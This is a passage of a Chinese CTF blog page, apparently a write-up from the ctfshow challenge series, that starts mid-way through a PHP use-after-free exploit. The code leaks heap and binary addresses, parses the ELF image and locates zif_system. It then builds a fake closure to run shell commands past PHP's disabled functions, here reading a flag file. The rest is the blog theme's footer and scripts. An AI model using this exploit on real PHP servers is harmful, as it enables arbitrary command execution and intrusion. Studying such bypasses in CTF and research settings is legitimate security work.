class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br>ctfshow(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/07/python3/">
+                        <span class="hidden-mobile">python实现简单的web指纹识别</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
